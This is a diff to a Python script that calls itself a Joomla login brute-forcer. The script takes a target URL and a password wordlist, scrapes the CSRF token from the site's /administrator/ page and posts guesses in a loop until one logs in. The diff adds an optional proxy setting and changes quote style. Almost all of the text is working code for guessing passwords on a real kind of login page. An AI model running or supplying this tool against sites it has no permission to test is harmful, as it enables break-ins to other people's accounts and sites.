@@ -1,6 +1,7 @@
 import requests
 from bs4 import BeautifulSoup
 import argparse
+from urllib.parse import urlparse
 
 class bcolors:
     HEADER = '\033[95m'
@@ -21,14 +22,21 @@ class Joomla():
         #Initialize args
         parser = argparse.ArgumentParser(description='Joomla login bruteforce')
         #required
-        parser.add_argument("-u", "--url", required=True, type=str, help="Joomla site")
-        parser.add_argument("-w", "--wordlist", required=True, type=str, help="Path to wordlist file")
+        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
+        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')
         #optional
-        parser.add_argument("-p", "--proxy", type=str, help="Specify proxy. Optional.")
+        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional.')
 
         args = parser.parse_args()
-
-        self.url = args.url+"/administrator/"
+        #parse args and save proxy
+        if args.proxy:
+            parsedproxyurl = urlparse(args.proxy)
+            self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
+        else:
+            self.proxy=None
+        
+        #http:/site/administrator
+        self.url = args.url+'/administrator/'
         self.ret = 'aW5kZXgucGhw'
         self.option='com_login'
         self.task='login'
@@ -45,7 +53,7 @@ class Joomla():
             #first get for cssrf token
             r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies)
             soup = BeautifulSoup(r.text, 'html.parser')
-            self.longstring = (soup.find_all("input", type="hidden")[-1]).get('name')
+            self.longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
 
             password=password.decode('utf-8')
             data = {
@@ -58,12 +66,12 @@ class Joomla():
             }
             r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies)
             soup = BeautifulSoup(r.text, 'html.parser')
-            response = soup.find("div", {"class": "alert-message"})
+            response = soup.find('div', {'class': 'alert-message'})
  
             if response:
-                print(f"{bcolors.FAIL} {username}:{password}{bcolors.ENDC}")
+                print(f'{bcolors.FAIL} {username}:{password}{bcolors.ENDC}')
             else:
-                print(f"{bcolors.OKGREEN} {username}:{password}{bcolors.ENDC}")
+                print(f'{bcolors.OKGREEN} {username}:{password}{bcolors.ENDC}')
                 break
 
 joomla = Joomla()
